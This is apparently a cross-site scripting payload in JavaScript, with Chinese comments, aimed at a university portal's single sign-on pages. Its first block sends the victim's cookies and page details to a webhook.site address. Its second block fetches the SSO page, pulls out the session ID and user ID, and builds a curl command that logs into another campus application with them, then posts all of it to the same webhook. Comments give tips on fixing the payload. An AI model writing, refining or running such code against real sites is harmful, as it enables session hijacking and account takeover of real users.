(async () => {
    var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    
    // 收集環境資訊
    var debugInfo = {
        location: window.location.href,      // 當前頁面 URL
        origin: window.location.origin,      // 當前 Origin (是 iportal2 還是 null?)
        isIframe: window.self !== window.top,// 是否在 iframe 裡？
        cookie: document.cookie              // 能讀到 Cookie 嗎？
    };

    // 發送除錯訊息
    fetch(webhook, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(debugInfo)
    });
})();

(async () => {
    var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    
    // 修正1：使用絕對路徑 (加斜線開頭)，防止相對路徑解析錯誤

	
    // 注意：你原本的代碼這裡少了引號，這會導致語法錯誤，記得加上
    var ssoUrl = "/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();

    try {
        const response = await fetch(ssoUrl);
        // 獲取最終 URL，確認有沒有發生非預期的跳轉
        const finalUrl = response.url; 
        const html = await response.text();

        // 嘗試提取
        const sessionMatch = html.match(/name=["']?sessionId["']?[\s\S]*?value=["']?([^"'\s>]+)["']?/i);
        const userMatch = html.match(/name=["']?userid["']?[\s\S]*?value=["']?([^"'\s>]+)["']?/i);

        // 數據包
        const data = {
            status: (sessionMatch && userMatch) ? "SUCCESS" : "FAILED",
            fetched_url: finalUrl, // 讓你知道最後抓的是哪個網址
            
            // 修正2：這是關鍵！把 HTML 傳回來讓我們看看到底發生了什麼
            debug_html_preview: html.substring(0, 1500), 
            
            sessionId: sessionMatch ? sessionMatch[1] : "NOT_FOUND",
            
            curl_command: sessionMatch
                ? `curl -i -s -k -X POST 'https://ap.itc.ntnu.edu.tw/GuidanceApp/StdtLoginCtrl?PageType=1B' \
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \
-H 'Referer: https://iportal2.ntnu.edu.tw/' \
-H 'Origin: https://iportal2.ntnu.edu.tw' \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data-raw 'sessionId=${encodeURIComponent(sessionMatch[1])}&userid=${userMatch[1]}&Action=Login&lang=zh_TW'`
                : "N/A"
        };

        fetch(webhook, {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify(data),
        });

    } catch (e) {
        fetch(webhook + "?error=" + encodeURIComponent(e.message));
    }
})();